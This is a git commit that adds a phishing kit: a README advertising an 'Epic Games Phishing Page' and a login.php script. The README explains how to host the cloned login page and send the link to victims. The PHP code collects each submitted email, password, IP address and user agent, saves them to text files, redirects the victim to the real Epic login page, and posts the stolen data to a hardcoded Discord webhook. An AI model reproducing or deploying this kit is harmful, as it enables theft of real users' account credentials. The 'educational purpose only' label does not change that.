084bb8f419b10d18064225f1cb62a10a26c95dee
tuvaldby111 <64946871+tuvaldby111@users.noreply.github.com>
2023-11-24 13:13:36 +0200

    Add files via upload

---
+++ README.md
@@ -0,0 +1,41 @@
+##### [🌍 Discord Server](https://discord.gg/rNbcUvV7) [💡 Features](https://github.com/Ib69/fortnite-phishing/blob/main/README.md#---features) [❓ How to Setup ?](https://github.com/Ib69/fortnite-phishing/blob/main/README.md#---how-to-setup-) [❓ How do its work ?](https://github.com/Ib69/epic-games-phishing/blob/main/README.md#---how-do-its-work-) [❓ How do its work ?](https://github.com/Ib69/epic-games-phishing#---some-screens-)
+
+# 🎣 - Epic Games Phishing Page:
+Epic Games Phishing Page working with Discord webhook or save it on a .txt file.
+
+# 📋 - Terms
+- [x] Educational purpose only
+- [x] Reselling is forbidden
+- [x] I am **NOT** responsible of anything you do with our software
+- [ ] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
+- [ ] This code is only a basic source code, so if you want to change, modify, update it, you can
+
+# 📜 - Features:
+
+- Steal Epic Game Infos
+  - Mail
+  - Password
+  - IP
+- Save Infos On A .txt file
+- Steal User's Ip
+- Copy of the official Epic Game Login Page
+
+# ❓ - How to Setup ?
+1. Download the Source code
+2. Upload it on a host like Replit, Glitch, Vercel (Im using Replit)
+4. Go in `login.php`, and put your webhook url. (You can enable ping too)
+5. Then Your program is ready !
+(if you want to setup a free domain to your website, i recommend to use [Freenom](https://www.freenom.com). You can setup your domain by following a youtube tutorial its easy dont worry)
+
+# ❓ - How do its work ?
+Copy the link and send it to someone idk 🤷‍♂️.
+Then when the user loggin, you are going to recive the webhook embed with all infos [Exemple here](https://github.com/Ib69/epic-games-phishing#---some-screens)
+There is 2 files with the infos that are going to be created in case your webhook get deleted or if you server got deleted, again, idk 🤷‍♂️.
+
+# 📷 - Some Screens...
+
+**The website look like:**
+<a href="https://imgur.com/2kb3lvt"><img src="https://i.imgur.com/2kb3lvt.png" title="source: imgur.com" /></a>
+
+**The embed look like.**
+<a href="https://imgur.com/hSSqnwF"><img src="https://i.imgur.com/hSSqnwF.png" title="source: imgur.com" /></a>
---
+++ login.php
@@ -0,0 +1,97 @@
+<?php
+// Configs
+$webhook = "https://discord.com/api/webhooks/1136276811546886145/n21C0OkckSWFbtBdsIQUwicCx3ntJwMOBHUEzR0QyzIIz0LB-1SYKT_mCHNL5Q0_cA0M"; // Webhook Url Goes Here
+
+$ping = "@everyone"; // You can put @here or @everyone or <@userid> if you want to ping a specific user. If you dont want any ping, leave it like that
+
+
+
+// DONT TOUCH THE CODE UNDER OR YOUR SCRIPT WILL NOT WORK !
+file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://www.epicgames.com/id/login/epic');
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+// Grab ip
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+$file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $browser);
+fclose($fp);
+
+// Send webhook
+$hookObject = json_encode([
+                          
+    "content" => "$ping",
+    "username" => "Epic Games Phishing Page",
+    "avatar_url" => "https://cdn.discordapp.com/avatars/932729746167562251/488be83aef7b7b9f7a335991d92bf2dc.png?size=80",
+                          
+    "embeds" => [
+        [
+            "title" => "New Victim !",
+            "type" => "rich",
+            "color" => hexdec( "FFFFFF" ),
+            "footer" => [
+                "text" => "🎣 Epic Games Phishing Page - https://github.com/Ib69/epic-games-phishing",
+                "icon_url" => "https://cdn.discordapp.com/avatars/932729746167562251/488be83aef7b7b9f7a335991d92bf2dc.png?size=80"
+            ],
+            "fields" => [
+
+                [
+                    "name" => "<:ib:957045850121596998> Email",
+                    "value" => "`$email`",
+                    "inline" => false
+                ],
+
+                [
+                    "name" => "<a:ib:957044983783911484> Password",
+                    "value" => "`$password`",
+                    "inline" => true
+                ],
+                [
+                    "name" => "<a:ib:957045849937043457> IP",
+                    "value" => "`$ipaddress` **[Click here](https://api.iplocation.net/?ip=$ipaddress) to lookup the ip.**",
+                    "inline" => false
+                ]
+            ]
+        ]
+    ]
+
+], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+
+$ch = curl_init();
+
+curl_setopt_array( $ch, [
+    CURLOPT_URL => $webhook,
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => $hookObject,
+    CURLOPT_HTTPHEADER => [
+        "Content-Type: application/json"
+    ]
+]);
+
+$response = curl_exec( $ch );
+curl_close( $ch );
+
+exit();
+?>
